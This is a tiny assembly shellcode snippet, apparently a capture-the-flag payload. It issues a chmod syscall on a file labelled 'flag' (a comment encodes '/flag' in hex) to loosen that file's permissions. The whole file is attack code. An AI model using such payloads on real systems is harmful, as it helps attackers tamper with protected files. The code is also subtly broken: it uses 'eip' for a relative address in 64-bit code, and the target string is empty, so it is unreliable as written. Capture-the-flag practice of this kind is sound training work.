.global _start
_start:
.intel_syntax noprefix

# 0x67616c662f

# chmod
mov al, 90
lea edi, [eip+flag]
xor esi,esi
mov sil, 0x77
syscall

flag:
.string ""
